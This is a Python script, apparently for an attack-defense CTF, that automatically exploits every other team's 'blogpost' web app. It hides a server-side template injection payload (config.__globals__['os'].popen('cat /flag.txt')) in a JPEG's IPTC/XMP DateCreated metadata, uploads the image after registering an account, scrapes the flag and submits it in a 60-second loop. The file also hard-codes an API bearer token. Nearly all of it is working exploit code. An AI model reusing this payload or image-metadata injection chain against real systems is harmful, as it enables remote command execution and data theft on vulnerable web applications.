#!/usr/bin/env python3
"""
Automated CTF Attack-Defense Script - SSTI Exploit
Combines SSTI payload injection with team enumeration and flag submission
"""

import requests
import subprocess
import os
import json
import re
import redis
import random
import string
import struct
import time
import traceback

# Configuration
CHALLENGE_NAME = "blogpost"
API_BASE_URL = "https://gemastik-api.siberlab.id/api"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc2MTYzNjM3MiwianRpIjoiNGZmNDc0YjYtYWM2MC00MjkxLTliZDQtNjQ4MjA0NjI5ZTU0IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6Ikhvd1RvQmVBU2VwdWgiLCJuYmYiOjE3NjE2MzYzNzIsImNzcmYiOiI1ZDU2ZGM2My1jYTdhLTRhZmItYjVmMi1jMDBlOTMxZTI5ZDMiLCJleHAiOjE3NjE3MjI3NzJ9.JUfb94CK-I0WeYtEZ1punOWsSBkf8tGHB9QXpdw4KVg"
TARGET_PORT = 12000
REDIS_HOST = "localhost"
REDIS_PORT = 6379
REDIS_CHECK = False
CREDENTIALS_DIR = "team_credentials"

# SSTI payload to read /flag.txt
SSTI_PAYLOAD = b"{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"

# Redis connection
try:
    redis_client = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, decode_responses=True)
    redis_client.ping()
    print("[+] Connected to Redis")
except Exception as e:
    print(f"[-] Failed to connect to Redis: {e}")
    redis_client = None

# Ensure credentials directory exists
if not os.path.exists(CREDENTIALS_DIR):
    os.makedirs(CREDENTIALS_DIR)
    print(f"[+] Created credentials directory: {CREDENTIALS_DIR}")

# ============================================================================
# JPEG PAYLOAD INJECTION (from patch_jpeg_datecreated.py)
# ============================================================================

def find_insert_pos(jpg: bytes) -> int:
    """Parse markers until Start Of Scan (SOS, 0xFFDA); insert before SOS"""
    i = 2  # skip SOI (FFD8)
    n = len(jpg)
    while i+1 < n:
        if jpg[i] != 0xFF:
            i += 1
            continue
        while i < n and jpg[i] == 0xFF:
            i += 1
        if i >= n: break
        marker = jpg[i]
        i += 1
        if marker in (0xD8, 0xD9):
            continue
        if marker == 0xDA:
            return i-2
        if i+2 > n: break
        seg_len = struct.unpack(">H", jpg[i:i+2])[0]
        i += seg_len
    return n-2 if n >= 2 and jpg[-2:] == b"\xFF\xD9" else n

def mk_app13_iptc_date_created(value: bytes) -> bytes:
    """Build IPTC IIM record for Date Created"""
    iptc = b"\x1C\x02\x37" + struct.pack(">H", len(value)) + value
    irb = b"8BIM" + struct.pack(">H", 0x0404) + b"\x00"
    if len(irb) % 2: irb += b"\x00"
    irb += struct.pack(">I", len(iptc)) + iptc
    if len(iptc) % 2: irb += b"\x00"
    payload = b"Photoshop 3.0\x00" + irb
    return b"\xFF\xED" + struct.pack(">H", len(payload)+2) + payload

def mk_app1_xmp_date_created(value: bytes) -> bytes:
    """Minimal XMP packet with photoshop:DateCreated"""
    xmp_id = b"http://ns.adobe.com/xap/1.0/\x00"
    xpacket_head = b'<?xpacket begin="\\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>'
    xpacket_tail = b'<?xpacket end="w"?>'
    xml = (
        b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
        b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
        b'<rdf:Description xmlns:photoshop="http://ns.adobe.com/photoshop/1.0/" '
        b'photoshop:DateCreated="' + value + b'"/>'
        b'</rdf:RDF></x:xmpmeta>'
    )
    pkt = xpacket_head + xml + xpacket_tail
    payload = xmp_id + pkt
    return b"\xFF\xE1" + struct.pack(">H", len(payload)+2) + payload

def inject_segments(inp: bytes, segments: list) -> bytes:
    """Inject segments into JPEG"""
    pos = find_insert_pos(inp)
    return inp[:pos] + b"".join(segments) + inp[pos:]

def create_malicious_jpeg(base_image_path="1x1.jpg"):
    """Create JPEG with SSTI payload in EXIF metadata"""
    if not os.path.exists(base_image_path):
        print(f"[-] Base image not found: {base_image_path}")
        return None
    
    data = open(base_image_path, "rb").read()
    app13 = mk_app13_iptc_date_created(SSTI_PAYLOAD)
    app1 = mk_app1_xmp_date_created(SSTI_PAYLOAD)
    patched = inject_segments(data, [app13, app1])
    
    print(f"[+] Created malicious JPEG with SSTI payload")
    return patched

# ============================================================================
# TEAM ENUMERATION AND FLAG SUBMISSION
# ============================================================================

def get_teams():
    """Get all teams and their IP addresses"""
    try:
        response = requests.get(f"{API_BASE_URL}/user")
        response.raise_for_status()
        teams = response.json()
        print(f"[+] Found {len(teams)} teams")
        return teams
    except Exception as e:
        print(f"[-] Error getting teams: {e}")
        return []

def extract_flag_content(flag):
    """Extract the content inside GEMASTIK18{...} wrapper"""
    match = re.search(r'GEMASTIK18\{([^}]+)\}', flag)
    if match:
        extracted = match.group(1)
        print(f"[+] Extracted flag content: {extracted}")
        return extracted
    else:
        print(f"[-] Could not extract flag content from: {flag}")
        return None

def is_team_failed(team_name, challenge_name):
    """Check if team has previously failed submission"""
    if not REDIS_CHECK:
        return False
    if redis_client:
        try:
            key = f"failed:{challenge_name}:{team_name}"
            return bool(redis_client.exists(key))
        except Exception as e:
            print(f"[-] Error checking Redis: {e}")
            return False
    return False

def store_failed_team(team_name, challenge_name):
    """Store failed team in Redis"""
    if redis_client:
        try:
            key = f"failed:{challenge_name}:{team_name}"
            redis_client.set(key, "1")
            print(f"[+] Stored failed submission for {team_name} in Redis")
        except Exception as e:
            print(f"[-] Error storing to Redis: {e}")

def submit_flag(flag, team_name):
    """Submit the flag to the API"""
    try:
        flag_content = extract_flag_content(flag)
        if not flag_content:
            print(f"[-] Invalid flag format: {flag}")
            return False, 0
        
        url = f"{API_BASE_URL}/flag"
        headers = {
            "Authorization": f"Bearer {AUTH_TOKEN}",
            "Content-Type": "application/json"
        }
        data = {"flag": flag_content}
        response = requests.post(url, headers=headers, json=data)
        
        status_code = response.status_code
        
        if status_code == 200:
            print(f"[+] Flag submitted successfully: {flag_content}")
            return True, status_code
        else:
            print(f"[-] Flag submission failed with status {status_code}: {response.text}")
            store_failed_team(team_name, CHALLENGE_NAME)
            return False, status_code
            
    except Exception as e:
        print(f"[-] Error submitting flag: {e}")
        return False, 0

# ============================================================================
# CREDENTIAL MANAGEMENT
# ============================================================================

def get_credentials_file(team_name):
    """Get the credentials file path for a team"""
    safe_team_name = re.sub(r'[^a-zA-Z0-9_-]', '_', team_name)
    return os.path.join(CREDENTIALS_DIR, f"{safe_team_name}.txt")

def load_credentials(team_name):
    """Load credentials from file for a team"""
    cred_file = get_credentials_file(team_name)
    if os.path.exists(cred_file):
        try:
            with open(cred_file, 'r') as f:
                lines = f.read().strip().split('\n')
                if len(lines) >= 2:
                    username = lines[0].strip()
                    password = lines[1].strip()
                    print(f"[+] Loaded credentials for {team_name}: {username}")
                    return username, password
        except Exception as e:
            print(f"[-] Error loading credentials for {team_name}: {e}")
    return None, None

def save_credentials(team_name, username, password):
    """Save credentials to file for a team"""
    cred_file = get_credentials_file(team_name)
    try:
        with open(cred_file, 'w') as f:
            f.write(f"{username}\n{password}\n")
        print(f"[+] Saved credentials for {team_name}: {username}")
        return True
    except Exception as e:
        print(f"[-] Error saving credentials for {team_name}: {e}")
        return False

def delete_credentials(team_name):
    """Delete credentials file for a team"""
    cred_file = get_credentials_file(team_name)
    if os.path.exists(cred_file):
        try:
            os.remove(cred_file)
            print(f"[+] Deleted old credentials for {team_name}")
            return True
        except Exception as e:
            print(f"[-] Error deleting credentials for {team_name}: {e}")
            return False
    return False

def generate_random_credentials():
    """Generate random username and password"""
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return username, password

# ============================================================================
# SSTI ATTACK FUNCTIONS
# ============================================================================

def check_server_alive(target_url):
    """Check if the target server is accessible"""
    try:
        resp = requests.get(target_url, timeout=5, allow_redirects=True)
        return True
    except:
        print(f"[-] Server unreachable or down")
        return False

def register(session, target_url, username, password):
    """Register a new user account"""
    print(f"[*] Registering user: {username}")
    
    data = {
        'username': username,
        'password': password
    }
    
    try:
        resp = session.post(f"{target_url}/register", data=data, allow_redirects=False, timeout=15)
        
        if resp.status_code in [200, 302]:
            print(f"[+] Registration successful")
            return True
        else:
            print(f"[-] Registration failed: HTTP {resp.status_code}")
            return False
    except requests.exceptions.Timeout:
        print(f"[-] Registration timeout")
        return False
    except requests.exceptions.ConnectionError:
        print(f"[-] Registration connection error")
        return False
    except Exception as e:
        print(f"[-] Registration error: {type(e).__name__}")
        return False

def login(session, target_url, username, password):
    """Login to the application"""
    print(f"[*] Logging in as: {username}")
    
    data = {
        'username': username,
        'password': password
    }
    
    try:
        resp = session.post(f"{target_url}/login", data=data, allow_redirects=True, timeout=15)
        
        if 'Welcome' in resp.text or resp.url.endswith('/gallery') or resp.url.endswith('/'):
            print(f"[+] Login successful")
            return True
        else:
            print(f"[-] Login failed")
            return False
    except requests.exceptions.Timeout:
        print(f"[-] Login timeout")
        return False
    except requests.exceptions.ConnectionError:
        print(f"[-] Login connection error")
        return False
    except Exception as e:
        print(f"[-] Login error: {type(e).__name__}")
        return False

def upload_malicious_image(session, target_url):
    """Upload malicious JPEG with SSTI payload"""
    print(f"[*] Creating and uploading malicious JPEG...")
    
    malicious_jpeg = create_malicious_jpeg()
    if not malicious_jpeg:
        return False
    
    files = {
        'image': ('exploit.jpg', malicious_jpeg, 'image/jpeg')
    }
    
    data = {
        'title': '(untitled)'
    }
    
    try:
        resp = session.post(f"{target_url}/upload", files=files, data=data, allow_redirects=True, timeout=15)
        
        if resp.status_code == 200 and ('Upload complete' in resp.text or 'gallery' in resp.url):
            print(f"[+] Malicious image uploaded successfully")
            return True
        else:
            print(f"[-] Upload failed: HTTP {resp.status_code}")
            return False
    except requests.exceptions.Timeout:
        print(f"[-] Upload timeout")
        return False
    except requests.exceptions.ConnectionError:
        print(f"[-] Upload connection error")
        return False
    except Exception as e:
        print(f"[-] Upload error: {type(e).__name__}")
        return False

def get_post_id_from_gallery(session, target_url):
    """Get the post ID from gallery page"""
    print(f"[*] Getting post ID from gallery...")
    
    try:
        resp = session.get(f"{target_url}/gallery", timeout=15)
        
        if resp.status_code != 200:
            print(f"[-] Gallery request failed: HTTP {resp.status_code}")
            return None
        
        # Extract post ID from href="/post/{id}"
        match = re.search(r'href="/post/(\d+)"', resp.text)
        if match:
            post_id = match.group(1)
            print(f"[+] Found post ID: {post_id}")
            return post_id
        else:
            print(f"[-] No post found in gallery")
            return None
    except Exception as e:
        print(f"[-] Error getting gallery: {type(e).__name__}")
        return None

def extract_flag_from_post(session, target_url, post_id):
    """Extract flag from post page"""
    print(f"[*] Extracting flag from /post/{post_id}...")
    
    try:
        resp = session.get(f"{target_url}/post/{post_id}", timeout=15)
        
        if resp.status_code != 200:
            print(f"[-] Post request failed: HTTP {resp.status_code}")
            return None
        
        # Extract flag from <pre> tag
        pre_match = re.search(r'<pre>.*?Date Created:\s*(GEMASTIK18\{[^}]+\})', resp.text, re.DOTALL)
        if pre_match:
            flag = pre_match.group(1)
            print(f"[+] Found flag in <pre> tag: {flag}")
            return flag
        
        # Also try to find GEMASTIK18{...} pattern anywhere
        flag_match = re.search(r'GEMASTIK18\{[^}]+\}', resp.text)
        if flag_match:
            flag = flag_match.group(0)
            print(f"[+] Found flag: {flag}")
            return flag
        
        print(f"[-] No flag found in post page")
        return None
        
    except Exception as e:
        print(f"[-] Error extracting flag: {type(e).__name__}")
        return None

def attack_team(team_name, ip_address):
    """Execute the full SSTI attack against a single team"""
    print(f"\n{'='*70}")
    print(f"[*] Attacking team: {team_name}")
    print(f"[*] Target IP: {ip_address}")
    print(f"{'='*70}")
    
    target_url = f"http://{ip_address}:{TARGET_PORT}"
    print(f"[*] Target URL: {target_url}")
    
    # Check if server is alive first
    if not check_server_alive(target_url):
        return None
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Try to load existing credentials
    username, password = load_credentials(team_name)
    
    if username and password:
        # Existing credentials found, try to login directly
        print(f"[*] Using existing credentials for {team_name}")
        if login(session, target_url, username, password):
            # Login successful, upload malicious image
            if upload_malicious_image(session, target_url):
                # Get post ID
                post_id = get_post_id_from_gallery(session, target_url)
                if post_id:
                    # Extract flag
                    flag = extract_flag_from_post(session, target_url, post_id)
                    if flag:
                        print(f"[+] Successfully extracted flag from {team_name}: {flag}")
                        return flag
        else:
            # Login failed, delete old credentials and re-register
            print(f"[!] Login failed with existing credentials, re-registering for {team_name}")
            delete_credentials(team_name)
            username = None
            password = None
    
    # No credentials or login failed, generate new ones
    if not username or not password:
        username, password = generate_random_credentials()
        print(f"[*] Generated new credentials - Username: {username}, Password: {password}")
        
        # Step 1: Register
        if not register(session, target_url, username, password):
            print("[!] Registration failed, trying to login anyway...")
        
        # Step 2: Login
        if not login(session, target_url, username, password):
            print(f"[-] Attack failed: Cannot login to {team_name}")
            return None
        
        # Save credentials after successful registration and login
        save_credentials(team_name, username, password)
        
        # Step 3: Upload malicious image
        if not upload_malicious_image(session, target_url):
            print(f"[-] Attack failed: Cannot upload image to {team_name}")
            return None
        
        # Step 4: Get post ID from gallery
        post_id = get_post_id_from_gallery(session, target_url)
        if not post_id:
            print(f"[-] Attack failed: Cannot get post ID from {team_name}")
            return None
        
        # Step 5: Extract flag from post page
        flag = extract_flag_from_post(session, target_url, post_id)
        
        if flag:
            print(f"[+] Successfully extracted flag from {team_name}: {flag}")
            return flag
        else:
            print(f"[-] Failed to extract flag from {team_name}")
            return None

# ============================================================================
# MAIN ATTACK LOOP
# ============================================================================

def main():
    print("="*70)
    print("CTF Attack-Defense Automated Bot - SSTI Exploit + Flag Submission")
    print("="*70)
    print("[*] Getting team information...")
    
    teams = get_teams()
    
    if not teams:
        print("[-] No teams found. Exiting.")
        return
    
    success_count = 0
    fail_count = 0
    
    for team in teams:
        team_name = team.get("username", "Unknown")
        ip_address = team.get("host_ip", "").strip()
        team_id = team.get("id", "")
        
        print(f"\n[*] Processing {team_name} (ID: {team_id}, IP: {ip_address})")
        
        if team_name.lower() == "howtobeasepuh":
            print(f"[!] Skipping own team: {team_name}")
            continue

        # Skip if team has previously failed submission
        if is_team_failed(team_name, CHALLENGE_NAME):
            print(f"[!] Skipping {team_name} - previously failed submission found in Redis")
            continue
        
        if not ip_address:
            print(f"[-] No IP address for {team_name}. Skipping.")
            fail_count += 1
            continue
        
        # Attack the team and get flag
        flag = attack_team(team_name, ip_address)
        
        if flag:
            # Submit the flag
            success, status_code = submit_flag(flag, team_name)
            if success:
                success_count += 1
            else:
                fail_count += 1
        else:
            print(f"[-] Failed to get flag from {team_name}")
            fail_count += 1
    
    print(f"\n{'='*70}")
    print(f"[*] Attack-Defense Bot finished")
    print(f"[+] Successful attacks: {success_count}")
    print(f"[-] Failed attacks: {fail_count}")
    print(f"{'='*70}")

if __name__ == "__main__":
    while True:
        main()
        print(f"\n[*] Waiting 60 seconds before next round...")
        time.sleep(60)